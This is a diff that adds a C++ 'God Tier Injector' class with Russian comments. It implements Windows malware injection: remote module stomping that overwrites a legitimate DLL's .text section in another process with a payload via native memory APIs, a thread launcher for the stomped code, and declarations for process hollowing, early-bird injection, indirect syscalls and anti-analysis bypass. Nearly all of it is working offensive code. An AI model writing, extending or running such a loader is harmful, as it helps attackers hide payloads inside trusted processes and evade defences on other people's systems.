@@ -1,0 +1,139 @@
+// =============================================
+// GOD TIER INJECTOR v1.3 - FINAL
+// Process Hollowing + Module Stomping (локальный + удалённый)
+// + ExecuteStompedModule + Indirect Syscalls
+// =============================================
+
+class GodTierInjector {
+public:
+    GodTierInjector();
+    ~GodTierInjector();
+
+    bool Initialize();
+
+    // === Методы инъекции ===
+    bool EarlyBirdInject(const std::wstring& targetPath, const std::vector<uint8_t>& payload);
+    bool ProcessHollowingInject(const std::wstring& targetPath, const std::vector<uint8_t>& newPE);
+    
+    // Module Stomping
+    bool ModuleStompingInject(const std::wstring& legitimateDllPath, const std::vector<uint8_t>& payload, PVOID* execAddr = nullptr);
+    bool RemoteModuleStompingInject(DWORD targetPid, const std::wstring& moduleName, const std::vector<uint8_t>& payload);
+
+    // Удобный запуск после Module Stomping
+    bool ExecuteStompedModule(PVOID address, bool wait = false);
+
+private:
+    bool ResolveSyscalls();
+    bool BypassAntiAnalysis();
+    bool FindTextSectionInRemoteProcess(HANDLE hProcess, HMODULE hModule, PVOID& textAddr, SIZE_T& textSize);
+
+    // ... остальные приватные методы Hollowing ...
+};
+
+// ==================== ВЫПОЛНЕНИЕ ПОСЛЕ MODULE STOMPING ====================
+bool GodTierInjector::ExecuteStompedModule(PVOID address, bool wait) {
+    if (!address) return false;
+
+    HANDLE hThread = CreateThread(
+        nullptr,
+        0,
+        (LPTHREAD_START_ROUTINE)address,
+        nullptr,
+        0,
+        nullptr
+    );
+
+    if (!hThread) return false;
+
+    if (wait) {
+        WaitForSingleObject(hThread, INFINITE);
+    }
+
+    CloseHandle(hThread);
+    return true;
+}
+
+// ==================== УДАЛЁННЫЙ MODULE STOMPING ====================
+bool GodTierInjector::RemoteModuleStompingInject(DWORD targetPid, 
+                                                 const std::wstring& moduleName,
+                                                 const std::vector<uint8_t>& payload) {
+    if (!Initialize()) return false;
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+    if (!hProcess) return false;
+
+    // Находим модуль в удалённом процессе (упрощённо — через EnumProcessModules)
+    HMODULE hModules[1024];
+    DWORD cbNeeded;
+    if (!EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    HMODULE hTargetModule = nullptr;
+    for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
+        WCHAR modName[MAX_PATH];
+        if (GetModuleFileNameExW(hProcess, hModules[i], modName, MAX_PATH)) {
+            if (wcsstr(modName, moduleName.c_str())) {
+                hTargetModule = hModules[i];
+                break;
+            }
+        }
+    }
+
+    if (!hTargetModule) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    PVOID textAddr = nullptr;
+    SIZE_T textSize = 0;
+
+    if (!FindTextSectionInRemoteProcess(hProcess, hTargetModule, textAddr, textSize)) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    if (payload.size() > textSize) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    // Меняем защиту
+    ULONG oldProtect = 0;
+    PVOID base = textAddr;
+    SIZE_T size = textSize;
+
+    g_NtProtectVirtualMemory(hProcess, &base, &size, PAGE_READWRITE, &oldProtect);
+
+    // Пишем пейлоад
+    g_NtWriteVirtualMemory(hProcess, textAddr, (PVOID)payload.data(), payload.size(), nullptr);
+
+    // Возвращаем защиту
+    base = textAddr;
+    size = textSize;
+    g_NtProtectVirtualMemory(hProcess, &base, &size, PAGE_EXECUTE_READ, &oldProtect);
+
+    CloseHandle(hProcess);
+    return true;
+}
+
+bool GodTierInjector::FindTextSectionInRemoteProcess(HANDLE hProcess, HMODULE hModule, 
+                                                     PVOID& textAddr, SIZE_T& textSize) {
+    BYTE headers[0x1000];
+    SIZE_T read = 0;
+    if (!ReadProcessMemory(hProcess, hModule, headers, sizeof(headers), &read)) return false;
+
+    auto dos = (PIMAGE_DOS_HEADER)headers;
+    auto nt  = (PIMAGE_NT_HEADERS)(headers + dos->e_lfanew);
+
+    auto section = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (memcmp(section[i].Name, ".text", 5) == 0) {
+            textAddr = (PVOID)((ULONG_PTR)hModule + section[i].VirtualAddress);
+            textSize = section[i].Misc.VirtualSize;
+            return true;
+        }
+    }
+    return false;
+}
